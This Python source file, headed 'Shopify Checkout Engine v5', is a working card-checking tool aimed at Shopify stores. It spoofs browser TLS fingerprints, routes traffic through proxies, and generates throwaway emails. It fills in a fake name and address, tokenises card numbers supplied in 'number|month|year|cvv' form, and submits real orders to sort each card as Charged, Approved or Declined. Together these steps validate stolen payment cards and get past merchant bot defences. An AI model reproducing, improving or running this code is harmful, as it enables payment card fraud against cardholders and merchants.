"""
Shopify Checkout Engine v5 — Fixed
====================================
- uses curl_cffi for TLS spoofing
- shares cookies across all requests
- validates session_token before proceeding
"""

import re
import asyncio
import random
import string
from urllib.parse import urlparse
from typing import Optional, Tuple, Dict, Any

from curl_cffi.requests import AsyncSession as CurlSession


PROPOSAL_ID = "46a1b8c390880a75b93bbb8bcc85ec9402747ab749272be67ef49c7a20854980"
SUBMIT_ID = "be971887221ed8700139ac3910deeea3315eb8451ce4c6d023b1a2d81f6498e5"

TIMEOUT = 30

BROWSER_PROFILES = ["chrome124", "chrome131", "chrome120", "chrome116", "edge101", "safari17_0"]

USER_AGENTS = {
    "chrome124": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "chrome131": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "chrome120": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "chrome116": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "edge101":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/101.0.1210.53",
    "safari17_0":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
}

GATEWAY_MAP = {
    "shopify_payments": "Shopify Payments",
    "authorize":        "Authorize.net",
    "authorize.net":    "Authorize.net",
    "stripe":           "Stripe",
    "braintree":        "Braintree",
    "cybersource":      "CyberSource",
    "square":           "Square",
    "paypal":           "PayPal",
    "klarna":           "Klarna",
    "affirm":           "Affirm",
    "afterpay":         "Afterpay",
    "clearpay":         "Afterpay",
    "adyen":            "Adyen",
    "checkout.com":     "Checkout.com",
    "worldpay":         "Worldpay",
    "bluesnap":         "BlueSnap",
    "nuvei":            "Nuvei",
    "heartland":        "Heartland",
    "firstdata":        "First Data",
}

WALLET_EXCLUDE = {"SHOP_PAY", "APPLE_PAY", "GOOGLE_PAY", "PAYPAL_EXPRESS", "VENMO"}

ADDRESS = {
    "firstName": "James",
    "lastName": "Anderson",
    "address1": "428 W 45th St",
    "address2": "",
    "city": "New York",
    "countryCode": "US",
    "zoneCode": "NY",
    "postalCode": "10036",
    "phone": "+12125550100",
    "oneTimeUse": False,
}


def parse_proxy(proxy_str: Optional[str]) -> Optional[str]:
    """Parse proxy string into URL format."""
    if not proxy_str:
        return None
    p = proxy_str.strip()
    if "://" in p:
        return p
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, passwd = parts
        return f"http://{user}:{passwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


def random_email() -> str:
    rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{rand}@gmail.com"


def random_attempt(checkout_token: str) -> str:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{checkout_token}-{suffix}"


def detect_gateway(raw: str) -> str:
    """Detect payment gateway from response."""
    text = raw.lower()
    names = re.findall(r'"name":"([^"]+)"', raw)
    displays = re.findall(r'"extensibilityDisplayName":"([^"]+)"', raw)
    all_values = names + displays

    wallet_lower = {w.lower() for w in WALLET_EXCLUDE}
    for val in all_values:
        vl = val.lower()
        if vl in wallet_lower:
            continue
        for key, label in GATEWAY_MAP.items():
            if key in vl:
                return label

    for key, label in GATEWAY_MAP.items():
        if key in text:
            return label

    return "Unknown"


def extract_payment_id(raw: str) -> str:
    """Extract payment method ID (non-wallet)."""
    ids = re.findall(r'"paymentMethodIdentifier":"([^"]+)"', raw)
    names = re.findall(r'"name":"([^"]+)"', raw)
    wallet_ids = set()
    for i, w in enumerate(names):
        if w in WALLET_EXCLUDE and i < len(ids):
            wallet_ids.add(ids[i])
    for pid in ids:
        if pid not in wallet_ids:
            return pid
    return ids[0] if ids else ""


# ══════════════════════════════════════════════════════════════════
# HTTP SESSION (curl_cffi — TLS spoofing + shared cookies)
# ══════════════════════════════════════════════════════════════════

class HTTPSession:
    """HTTP session with curl_cffi TLS spoofing."""

    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.profile = random.choice(BROWSER_PROFILES)
        self.user_agent = USER_AGENTS[self.profile]
        self.session: Optional[CurlSession] = None

    async def __aenter__(self) -> "HTTPSession":
        kwargs = {
            "impersonate": self.profile,
            "timeout": TIMEOUT,
            "headers": {
                "User-Agent": self.user_agent,
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
            },
        }
        if self.proxy:
            kwargs["proxy"] = self.proxy
        self.session = CurlSession(**kwargs)
        return self

    async def __aexit__(self, *args) -> None:
        if self.session:
            await self.session.close()

    async def get(self, url: str, headers: Optional[Dict] = None,
                  allow_redirects: bool = True) -> Tuple[int, str, Dict[str, str]]:
        merged = {"User-Agent": self.user_agent}
        if headers:
            merged.update(headers)
        r = await self.session.get(url, headers=merged, allow_redirects=allow_redirects)
        return r.status_code, r.text, dict(r.cookies)

    async def post(self, url: str, json_data: Dict = None,
                   headers: Optional[Dict] = None) -> Tuple[int, str]:
        merged = {"User-Agent": self.user_agent}
        if headers:
            merged.update(headers)
        r = await self.session.post(url, json=json_data, headers=merged)
        return r.status_code, r.text


# ══════════════════════════════════════════════════════════════════
# SHOPIFY FLOW STEPS
# ══════════════════════════════════════════════════════════════════

async def get_variant(session: HTTPSession, site: str) -> str:
    """Find available variant."""
    url = f"{site}/products.json?limit=50"
    status, text, _ = await session.get(url)
    if status != 200:
        raise Exception(f"products_json status={status}")

    import json
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        raise Exception("products_json invalid json")

    for product in data.get("products", []):
        for variant in product.get("variants", []):
            try:
                available = variant.get("available", False)
                price = float(variant.get("price", 0))
                if available and price >= 0.50:
                    return str(variant["id"])
            except Exception:
                continue
    raise Exception("No valid variant found")


async def open_checkout(session: HTTPSession, site: str, variant_id: str) -> Tuple[str, str, str]:
    """Open checkout — استخدم curl_cffi مع TLS spoofing."""
    url = f"{site}/cart/{variant_id}:1"
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": site + "/",
    }
    status, html, cookies = await session.get(url, headers=headers, allow_redirects=True)

    if status not in (200, 302):
        raise Exception(f"cart status={status}")

    # Extract session token
    m = re.search(r'serialized-sessionToken" content="([^"]+)"', html)
    if not m:
        # حاول regex بديل
        m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', html)
    if not m:
        # اطبع جزء من HTML للتشخيص
        raise Exception(f"session_token not found (html_len={len(html)})")

    session_token = m.group(1).replace("&quot;", '"').replace("&#34;", '"').replace('\\"', '"')

    # Extract checkout token
    m2 = re.search(r"/checkouts/cn/([a-zA-Z0-9_-]+)", html)
    if not m2:
        raise Exception("checkout_token not found")
    checkout_token = m2.group(1)

    return session_token, checkout_token, html


def build_proposal_body(session_token: str, queue_token: Optional[str],
                        variant_id: str, email: Optional[str] = None,
                        with_address: bool = False) -> Dict[str, Any]:
    """Build Proposal body."""
    if with_address:
        destination = {"partialStreetAddress": {**ADDRESS}}
    else:
        destination = {
            "partialStreetAddress": {
                "address1": "", "city": "", "countryCode": "US",
                "lastName": "", "phone": "", "oneTimeUse": False,
            }
        }

    buyer: Dict[str, Any] = {
        "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {"countryCode": "US"},
        "rememberMe": False,
    }
    if email:
        buyer["email"] = email
        buyer["emailChanged"] = True

    return {
        "operationName": "Proposal",
        "id": PROPOSAL_ID,
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken": queue_token,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": destination,
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": not with_address,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": "00000000-0000-0000-0000-000000000001",
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None, "lineComponents": [],
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "", "city": "", "countryCode": "US",
                        "lastName": "", "phone": "",
                    }
                },
            },
            "buyerIdentity": buyer,
            "tip": {"tipLines": []},
            "poNumber": None,
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"any": True},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": [],
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None, "signatureUuid": None,
                "lineItemScriptChanges": [], "paymentScriptChanges": [],
                "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
        },
    }


async def proposal1(session: HTTPSession, site: str, session_token: str,
                    checkout_token: str, variant_id: str) -> Tuple[str, str, str, str]:
    """Proposal #1 — extract gateway."""
    url = f"{site}/checkouts/internal/graphql/persisted?operationName=Proposal"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Checkout-One-Session-Token": session_token,
        "Origin": site,
        "Referer": f"{site}/checkouts/cn/{checkout_token}/en-us",
    }
    body = build_proposal_body(session_token, None, variant_id)
    status, raw = await session.post(url, json_data=body, headers=headers)

    if status != 200:
        raise Exception(f"proposal1 status={status} body={raw[:200]}")

    m = re.search(r'"queueToken":"([^"]+)"', raw)
    if not m:
        raise Exception(f"queueToken not found: {raw[:200]}")
    queue_token = m.group(1)

    gateway = detect_gateway(raw)
    payment_id = extract_payment_id(raw)

    price_m = re.search(r'"compareAtPrice":\{"amount":"([^"]+)"', raw)
    price = f"${price_m.group(1)}" if price_m else "-"

    return queue_token, gateway, payment_id, price


async def vault_card(session: HTTPSession, cc: str, site: str) -> str:
    """PCI tokenization — Shopify PCI always."""
    parts = cc.split("|")
    number = parts[0].strip()
    month = int(parts[1])
    year = int(parts[2])
    if year < 100:
        year += 2000
    cvv = parts[3].strip()
    domain = urlparse(site).netloc

    url = "https://checkout.pci.shopifyinc.com/sessions"
    body = {
        "credit_card": {
            "number": number,
            "month": month,
            "year": year,
            "verification_value": cvv,
            "name": "John Smith",
        },
        "payment_session_scope": domain,
    }
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://checkout.pci.shopifyinc.com",
        "Referer": "https://checkout.pci.shopifyinc.com/",
    }

    status, text = await session.post(url, json_data=body, headers=headers)

    if status != 200:
        raise Exception(f"vault status={status} body={text[:200]}")

    import json
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        raise Exception(f"vault invalid json: {text[:200]}")

    token = data.get("id", "")
    if not token:
        raise Exception(f"vault empty: {text[:200]}")
    return token


async def proposal2(session: HTTPSession, site: str, session_token: str,
                    checkout_token: str, queue_token: str, variant_id: str,
                    email: str) -> str:
    """Proposal #2 — email + address."""
    url = f"{site}/checkouts/internal/graphql/persisted?operationName=Proposal"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Checkout-One-Session-Token": session_token,
        "Origin": site,
        "Referer": f"{site}/checkouts/cn/{checkout_token}/en-us",
    }
    body = build_proposal_body(session_token, queue_token, variant_id,
                                email=email, with_address=True)
    status, raw = await session.post(url, json_data=body, headers=headers)

    if status != 200:
        raise Exception(f"proposal2 status={status} body={raw[:200]}")

    m = re.search(r'"queueToken":"([^"]+)"', raw)
    if not m:
        raise Exception(f"queueToken2 not found: {raw[:200]}")
    return m.group(1)


async def submit(session: HTTPSession, site: str, session_token: str,
                 checkout_token: str, queue_token2: str, vault_token: str,
                 payment_id: str, variant_id: str, email: str) -> Tuple[str, str]:
    """SubmitForCompletion."""
    url = f"{site}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Checkout-One-Session-Token": session_token,
        "Origin": site,
        "Referer": f"{site}/checkouts/cn/{checkout_token}/en-us",
    }
    addr = ADDRESS

    body = {
        "operationName": "SubmitForCompletion",
        "id": SUBMIT_ID,
        "variables": {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token2,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "streetAddress": {
                                "address1": addr["address1"], "address2": "",
                                "city": addr["city"], "countryCode": addr["countryCode"],
                                "zoneCode": addr["zoneCode"], "postalCode": addr["postalCode"],
                                "firstName": addr["firstName"], "lastName": addr["lastName"],
                                "phone": addr["phone"], "oneTimeUse": False,
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True},
                            },
                            "options": {},
                        },
                        "targetMerchandiseLines": {
                            "lines": [{"stableId": "00000000-0000-0000-0000-000000000001"}]
                        },
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": "00000000-0000-0000-0000-000000000001",
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": [],
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "amount": {"any": True},
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "sessionId": vault_token,
                                "paymentMethodIdentifier": payment_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": addr["address1"], "address2": "",
                                        "city": addr["city"], "countryCode": addr["countryCode"],
                                        "zoneCode": addr["zoneCode"], "postalCode": addr["postalCode"],
                                        "firstName": addr["firstName"], "lastName": addr["lastName"],
                                        "phone": addr["phone"],
                                    }
                                },
                                "cardSource": None,
                            }
                        },
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": addr["address1"], "address2": "",
                            "city": addr["city"], "countryCode": addr["countryCode"],
                            "zoneCode": addr["zoneCode"], "postalCode": addr["postalCode"],
                            "firstName": addr["firstName"], "lastName": addr["lastName"],
                            "phone": addr["phone"],
                        }
                    },
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                    "email": email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [],
                    "shopPayOptInPhone": {"countryCode": "US"},
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "poNumber": None,
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"any": True},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": [],
            },
            "attemptToken": random_attempt(checkout_token),
            "metafields": [],
            "analytics": {
                "requestUrl": f"{site}/checkouts/cn/{checkout_token}/en-us",
                "pageId": "0000000000000000",
            },
        },
    }

    status, raw = await session.post(url, json_data=body, headers=headers)

    if status != 200:
        raise Exception(f"submit status={status} body={raw[:200]}")

    typename_m = re.search(
        r'"__typename":"(SubmitSuccess|SubmitFailed|SubmitThrottled|SubmitAlreadyAccepted)"',
        raw,
    )
    typename = typename_m.group(1) if typename_m else "Unknown"

    errors = re.findall(r'"message":"([^"]+)"', raw)
    codes = re.findall(r'"code":"([^"]+)"', raw)
    msg = errors[0] if errors else (codes[0] if codes else raw[:100])

    receipt_m = re.search(r'"id":"(gid://shopify/\w+Receipt/[^"]+)"', raw)

    if typename == "SubmitSuccess":
        return ("Charged" if receipt_m else "Approved"), msg
    elif typename == "SubmitFailed":
        return "Declined", msg
    else:
        return "Error", msg


# ══════════════════════════════════════════════════════════════════
# MAIN CHECK
# ══════════════════════════════════════════════════════════════════

async def check_card(cc: str, site: str, proxy_str: Optional[str]) -> Dict[str, Any]:
    """Check a card on a Shopify store."""
    if not site.startswith("http"):
        site = "https://" + site

    proxy = parse_proxy(proxy_str)
    email = random_email()

    async with HTTPSession(proxy=proxy) as session:
        variant_id = await get_variant(session, site)
        session_token, checkout_token, html = await open_checkout(session, site, variant_id)
        queue_token, gateway, payment_id, price = await proposal1(
            session, site, session_token, checkout_token, variant_id,
        )
        vault_token = await vault_card(session, cc, site)
        queue_token2 = await proposal2(
            session, site, session_token, checkout_token, queue_token,
            variant_id, email,
        )
        status, message = await submit(
            session, site, session_token, checkout_token, queue_token2,
            vault_token, payment_id, variant_id, email,
        )

    return {
        "status": status,
        "message": message,
        "gateway": gateway,
        "price": price,
    }